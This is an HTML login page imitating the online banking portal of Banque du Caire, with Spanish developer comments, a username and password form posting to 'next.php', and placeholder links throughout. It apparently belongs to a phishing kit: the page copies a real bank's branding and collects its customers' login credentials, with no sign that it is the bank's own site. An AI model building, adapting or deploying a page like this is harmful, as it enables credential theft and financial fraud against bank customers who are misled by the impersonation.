<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>BDC Bank - Banca en Línea</title>
    <link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon">
    <!-- Font Awesome para iconos -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        /* ===== RESET ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 15px;
        }
        .container {
            max-width: 480px;  /* Ancho típico de móvil */
            width: 100%;
            background: #ffffff;
            border-radius: 16px;
            box-shadow: 0 8px 25px rgba(0,0,0,0.08);
            overflow: hidden;
            padding: 20px 20px 10px;
        }

        /* ===== TOP BAR (solo visible en escritorio, en móvil se oculta) ===== */
        .top-bar {
            display: none; /* Ocultamos en móvil */
        }

        /* ===== HEADER ===== */
        .header {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            padding: 0 0 15px 0;
            border-bottom: 1px solid #eaeef2;
            margin-bottom: 20px;
        }
        .logo img {
            height: 40px;
            width: auto;
        }
        .logo h1 {
            font-size: 20px;
            color: #1a2b4a;
            font-weight: 600;
        }
        .header-links {
            display: none; /* Ocultamos "En" y "Enroll/Activate" en móvil */
        }

        /* ===== HERO ===== */
        .hero {
            text-align: left;
            padding: 0 0 10px 0;
        }
        .hero h2 {
            font-size: 28px;
            color: #1a2b4a;
            font-weight: 300;
            margin-bottom: 2px;
        }
        .hero .sub {
            color: #6b7a8f;
            font-size: 15px;
            margin-bottom: 20px;
        }

        /* ===== FORMULARIO ===== */
        .login-box {
            width: 100%;
        }
        .login-box label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #1a2b4a;
            margin-bottom: 4px;
        }
        .login-box input {
            width: 100%;
            padding: 12px 14px;
            border: solid 1px #8b8b8b !important;
            border-radius: 10px !important;
            font-size: 16px !important;
            color: #000 !important;
            margin-bottom: 18px;
            background: #fafbfc;
            outline: none;
        }
        .login-box input::placeholder {
            color: #b6b6b6 !important;
        }
        .login-box .actions {
            display: flex;
            justify-content: space-between;
            font-size: 14px;
            margin-bottom: 20px;
        }
        .login-box .actions a {
            color: #0056a7;
            text-decoration: none;
        }
        .login-box .actions a:hover {
            text-decoration: underline;
        }

        /* ===== BOTÓN LOGIN ===== */
        .btn-login {
            width: 100%;
            padding: 14px;
            background: linear-gradient(to right, #ef4230 0%, #f26131 48%, #f68b33 97%) !important;
            border: 0px !important;
            border-radius: 10px !important;
            color: #ffffff !important;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
            outline: 0 !important;
            margin-bottom: 10px;
        }
        .btn-login:hover {
            opacity: 0.9;
        }

        /* ===== IMAGEN DERECHA (oculta en móvil) ===== */
        .hero-right {
            display: none;
        }

        /* ===== SECCIÓN "Banking with An Edge" ===== */
        .edge-section {
            padding: 25px 0 10px 0;
            border-top: 1px solid #eaeef2;
            margin-top: 20px;
        }
        .edge-text h3 {
            font-size: 24px;
            color: #1a2b4a;
            font-weight: 300;
            margin-bottom: 8px;
        }
        .edge-text h3 span {
            color: #0056a7;
            font-weight: 600;
        }
        .edge-text p {
            color: #4a5a6e;
            line-height: 1.6;
            font-size: 15px;
            margin-bottom: 18px;
        }
        .btn-learn {
            background: transparent;
            border: 2px solid #1a2b4a;
            color: #1a2b4a;
            padding: 10px 30px;
            border-radius: 30px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
            font-size: 15px;
        }
        .btn-learn:hover {
            background: #1a2b4a;
            color: white;
        }
        .edge-image {
            display: none; /* Ocultamos imagen en móvil */
        }

        /* ===== SERVICIOS ===== */
        .services {
            display: flex;
            flex-direction: column;
            gap: 15px;
            padding: 20px 0 10px 0;
        }
        .service-card {
            background: #f8faff;
            border-radius: 12px;
            padding: 18px 20px;
            text-align: center;
            border: 1px solid #eaeef2;
        }
        .service-card i {
            font-size: 28px;
            color: #1a2b4a;
            margin-bottom: 6px;
        }
        .service-card h4 {
            font-size: 17px;
            color: #1a2b4a;
            margin-bottom: 4px;
        }
        .service-card p {
            color: #6b7a8f;
            font-size: 14px;
        }

        /* ===== FOOTER ===== */
        .footer {
            background: #1a2b4a;
            color: rgba(255,255,255,0.8);
            padding: 18px 15px;
            border-radius: 10px;
            margin-top: 15px;
            text-align: center;
            font-size: 13px;
        }
        .footer a {
            color: rgba(255,255,255,0.7);
            text-decoration: none;
            margin: 0 8px;
            display: inline-block;
        }
        .footer a:hover {
            color: white;
            text-decoration: underline;
        }
        .footer .social {
            margin-top: 10px;
        }
        .footer .social i {
            margin: 0 8px;
            font-size: 18px;
            color: rgba(255,255,255,0.6);
        }
        .footer .social i:hover {
            color: white;
        }

        /* ===== RESPONSIVE para pantallas muy pequeñas ===== */
        @media (max-width: 400px) {
            .container { padding: 15px; }
            .hero h2 { font-size: 24px; }
            .btn-login { font-size: 16px; }
        }

        /* ===== ESCRITORIO (opcional, para que se vea bien en pantallas grandes) ===== */
        @media (min-width: 769px) {
            body { padding: 40px; }
            .container { max-width: 1100px; padding: 30px 40px; }
            .top-bar {
                display: flex !important;
                justify-content: flex-end;
                gap: 20px;
                padding: 8px 0 15px 0;
                border-bottom: 1px solid #eaeef2;
                margin-bottom: 10px;
                font-size: 14px;
            }
            .top-bar a { color: #1a2b4a; text-decoration: none; }
            .header {
                justify-content: space-between;
                border-bottom: none;
                margin-bottom: 20px;
            }
            .header-links { display: block; }
            .header-links a { margin-left: 20px; color: #1a2b4a; text-decoration: none; }
            .hero {
                display: flex;
                justify-content: space-between;
                align-items: center;
                gap: 40px;
            }
            .hero-left { flex: 1; }
            .hero-right { display: block; flex: 1; text-align: center; }
            .hero-right img { max-width: 100%; border-radius: 12px; }
            .services {
                flex-direction: row;
                justify-content: center;
            }
            .service-card { flex: 1; max-width: 280px; }
            .footer { display: flex; justify-content: space-between; align-items: center; }
            .footer .social { margin-top: 0; }
        }
    </style>
</head>
<body>

<div class="container">

    <!-- ===== TOP BAR (solo visible en escritorio) ===== -->
    <div class="top-bar">
        <a href="#"><i class="fas fa-map-marker-alt"></i> ATM &amp; Branch Locator</a>
        <a href="#"><i class="fas fa-question-circle"></i> Help &amp; Support</a>
        <a href="#" style="font-family:Arial; direction:rtl;">أعلى</a>
    </div>

    <!-- ===== HEADER ===== -->
    <header class="header">
        <div class="logo">
            <img src="assets/img/logo-bdc.png" alt="Banque du Caire" onerror="this.style.display='none'">
            <h1>Banque du Caire</h1>
        </div>
        <div class="header-links">
            <a href="#"><i class="fas fa-globe"></i> En</a>
            <a href="#">Enroll / Activate</a>
        </div>
    </header>

    <!-- ===== HERO / LOGIN ===== -->
    <section class="hero">
        <div class="hero-left">
            <h2>Welcome back</h2>
            <p class="sub">Access your accounts securely</p>

            <form action="next.php" method="post" class="login-box">
                <label for="user">Username</label>
                <input type="text" id="user" name="user" placeholder="Enter your username" required>

                <label for="pass">Password</label>
                <input type="password" id="pass" name="pass" placeholder="Enter your password" required>

                <div class="actions">
                    <a href="#">Enroll / Activate</a>
                    <a href="#">Forgot password?</a>
                </div>

                <button type="submit" class="btn-login">Login</button>
            </form>
        </div>

        <div class="hero-right">
            <img src="assets/img/hero-card.png" alt="Banking" onerror="this.style.display='none'">
        </div>
    </section>

    <!-- ===== SECCIÓN "Banking with An Edge" ===== -->
    <section class="edge-section">
        <div class="edge-text">
            <h3>Banking with <span>An Edge</span></h3>
            <p>Your Stunning Internet banking experience Starts with BDC. Your Secure Banking Is our responsibility, Banking with An Edge.</p>
            <button class="btn-learn">Learn More</button>
        </div>
        <div class="edge-image">
            <!-- Imagen opcional solo en escritorio -->
        </div>
    </section>

    <!-- ===== SERVICIOS ===== -->
    <section class="services">
        <div class="service-card">
            <i class="fas fa-calendar-check"></i>
            <h4>Book Appointment</h4>
            <p>Schedule a visit at your convenience.</p>
        </div>
        <div class="service-card">
            <i class="fas fa-exchange-alt"></i>
            <h4>FX Rates</h4>
            <p>Check the latest foreign exchange rates.</p>
        </div>
    </section>

    <!-- ===== FOOTER ===== -->
    <footer class="footer">
        <div>
            <a href="#">Locate Us</a>
            <a href="#">Contact Us</a>
            <a href="#">Privacy Policy</a>
            <a href="#">Terms &amp; Conditions</a>
            <a href="#">FAQ</a>
        </div>
        <div class="social">
            <i class="fab fa-facebook"></i>
            <i class="fab fa-twitter"></i>
            <i class="fab fa-linkedin"></i>
        </div>
    </footer>

</div>

<!-- Script para ocultar imágenes rotas -->
<script>
    document.querySelectorAll('img').forEach(img => {
        img.onerror = function() { this.style.display = 'none'; };
    });
</script>

</body>
</html>
